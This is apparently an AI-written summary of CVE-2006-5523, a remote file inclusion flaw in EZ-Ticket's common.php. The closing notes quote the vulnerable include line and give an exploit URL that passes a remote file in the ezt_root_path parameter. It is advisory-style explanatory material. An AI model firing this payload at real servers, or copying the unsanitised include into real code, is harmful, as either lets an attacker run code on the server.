Based on the provided content, here's an analysis of CVE-2006-5523:

**Root cause of vulnerability:**
The vulnerability is due to a Remote File Inclusion (RFI) flaw in the `common.php` file of EZ-Ticket v0.0.1. Specifically, the `ezt_root_path` parameter is not properly sanitized, allowing an attacker to include remote files.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The application includes a file based on user-controlled input (`ezt_root_path`) without proper validation.

**Impact of exploitation:**
- An attacker can include and execute arbitrary code from a remote server. This can lead to a variety of malicious activities, including:
    - Arbitrary code execution on the server.
    - Data theft or manipulation.
    - Server compromise.
    - Website defacement.

**Attack vectors:**
- The primary attack vector is through HTTP requests to the `common.php` file with a malicious `ezt_root_path` parameter.

**Required attacker capabilities/position:**
- The attacker needs to be able to make HTTP requests to the target server hosting the vulnerable EZ-Ticket application.
- The attacker must have a server under their control to host the malicious code that will be included.

**Additional notes:**
- The vulnerable code is located in `common.php`, line 3: `include($ezt_root_path . ‘/functions/anti-hack.php’);`.
- The provided exploit example is `http://[Target]/[Path]/common.php?ezt_root_path=http://cmd.gif?`
- The vulnerability is present in EZ-Ticket v0.0.1.
